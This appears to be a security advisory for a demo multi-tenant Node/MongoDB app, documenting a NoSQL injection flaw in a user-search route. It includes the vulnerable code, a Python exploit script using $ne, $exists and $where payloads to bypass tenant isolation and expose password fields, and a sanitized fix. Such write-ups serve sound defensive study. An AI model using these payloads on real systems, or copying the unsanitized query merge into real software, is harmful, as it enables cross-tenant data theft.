# Vulnerability: NoSQL Injection

## 1. Vulnerability Name
**CWE-943: Improper Neutralization of Special Elements in Data Query Logic**

## 2. Location in Code
- **File:** `backend/src/routes/api.js` (lines 10-30)

```javascript
// api.js - NoSQL injection in user search
router.get('/users', auth, async (req, res) => {
    const { search, tenantId } = req.query;
    let query = {};
    
    if (tenantId) {
        query.tenantId = tenantId;
    }
    
    // VULNERABILITY: Direct user input in query without sanitization
    if (search) {
        if (typeof search === 'object') {
            query = { ...query, ...search };
        } else {
            query.$or = [
                { email: { $regex: search, $options: 'i' } },
                { 'profile.fullName': { $regex: search, $options: 'i' } }
            ];
        }
    }
    
    const users = await User.find(query);
    res.json(users);
});
```

## 3. Technical Root Cause
The application directly merges user-controlled input into MongoDB queries without proper validation or sanitization. When the search parameter is an object, it's spread directly into the query, allowing attackers to inject arbitrary MongoDB operators and bypass authentication/authorization controls.

## 4. Proof of Concept Explanation
1. Send a GET request to `/api/users` with search parameter as JSON object
2. Inject MongoDB operators like `$ne`, `$gt`, `$where` to manipulate query logic
3. Bypass tenant isolation and access unauthorized user data
4. Extract sensitive information from all users in the database

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_nosql_injection():
    base_url = "http://localhost:5000"
    
    # Login to get authentication token
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    login_response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    
    if login_response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = login_response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print("[+] Testing NoSQL injection vulnerabilities...")
    
    # Test 1: Bypass tenant isolation using $ne operator
    print("\n[1] Testing tenant isolation bypass...")
    nosql_payload = {
        "search": {"tenantId": {"$ne": None}},
        "tenantId": {"$ne": None}
    }
    
    response = requests.get(
        f"{base_url}/api/users",
        headers=headers,
        params=nosql_payload
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"[!] NOSQL INJECTION SUCCESS: Retrieved {len(users)} users across all tenants")
        for user in users[:3]:
            print(f"    User: {user.get('email')} | Tenant: {user.get('tenantId')}")
    
    # Test 2: Extract all users using $exists operator
    print("\n[2] Testing data extraction with $exists...")
    exists_payload = {
        "search": {"email": {"$exists": True}}
    }
    
    response = requests.get(
        f"{base_url}/api/users",
        headers=headers,
        params=exists_payload
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"[!] DATA EXTRACTION SUCCESS: Found {len(users)} total users")
    
    # Test 3: Password field extraction (if not properly excluded)
    print("\n[3] Testing sensitive field extraction...")
    password_payload = {
        "search": {"password": {"$exists": True}}
    }
    
    response = requests.get(
        f"{base_url}/api/users",
        headers=headers,
        params=password_payload
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"[!] SENSITIVE DATA ACCESS: Retrieved {len(users)} users with password field check")
        
        # Check if passwords are exposed
        for user in users[:2]:
            if 'password' in user:
                print(f"    CRITICAL: Password exposed for {user.get('email')}: {user.get('password')}")
    
    # Test 4: JavaScript injection using $where (if enabled)
    print("\n[4] Testing JavaScript injection with $where...")
    js_payload = {
        "search": {"$where": "this.email.length > 0"}
    }
    
    response = requests.get(
        f"{base_url}/api/users",
        headers=headers,
        params=js_payload
    )
    
    if response.status_code == 200:
        users = response.json()
        print(f"[!] JAVASCRIPT INJECTION: $where operator executed, found {len(users)} users")
    
    return True

if __name__ == "__main__":
    exploit_nosql_injection()
```

## 6. Impact
- **Authentication Bypass:** Access to unauthorized user data across tenants
- **Data Exfiltration:** Extraction of sensitive user information and credentials
- **Privilege Escalation:** Potential admin account discovery and access
- **System Compromise:** JavaScript execution through $where operator

**CVSS Score:** 8.8 (High)

## 7. Fix Recommendation

Implement proper input validation and query sanitization:

```javascript
// Secure user search implementation
const mongoose = require('mongoose');

// Input sanitization middleware
const sanitizeQuery = (req, res, next) => {
    // Remove MongoDB operators from query parameters
    const sanitize = (obj) => {
        if (obj && typeof obj === 'object') {
            for (const key in obj) {
                if (key.startsWith('$')) {
                    delete obj[key];
                } else if (typeof obj[key] === 'object') {
                    sanitize(obj[key]);
                }
            }
        }
    };
    
    sanitize(req.query);
    sanitize(req.body);
    next();
};

// Secure user search endpoint
router.get('/users', auth, sanitizeQuery, async (req, res) => {
    try {
        const { search } = req.query;
        
        // Build secure query with proper tenant isolation
        let query = {
            tenantId: req.user.tenantId // Always enforce tenant boundary
        };
        
        // Validate and sanitize search input
        if (search && typeof search === 'string' && search.length <= 100) {
            // Escape special regex characters
            const escapedSearch = search.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            
            query.$or = [
                { email: { $regex: escapedSearch, $options: 'i' } },
                { 'profile.fullName': { $regex: escapedSearch, $options: 'i' } }
            ];
        }
        
        const users = await User.find(query)
            .select('email profile role createdAt') // Explicitly select safe fields
            .limit(50) // Limit results
            .sort({ createdAt: -1 });
            
        res.json(users);
    } catch (error) {
        res.status(500).json({ error: 'Search failed' });
    }
});

// Alternative: Use mongoose-sanitizer plugin
const mongooseSanitizer = require('mongoose-sanitizer');
app.use(mongooseSanitizer());

// Whitelist approach for query parameters
const allowedSearchFields = ['email', 'profile.fullName'];
const buildSecureQuery = (searchTerm, userTenantId) => {
    const query = { tenantId: userTenantId };
    
    if (searchTerm && typeof searchTerm === 'string') {
        const escapedTerm = searchTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        query.$or = allowedSearchFields.map(field => ({
            [field]: { $regex: escapedTerm, $options: 'i' }
        }));
    }
    
    return query;
};
```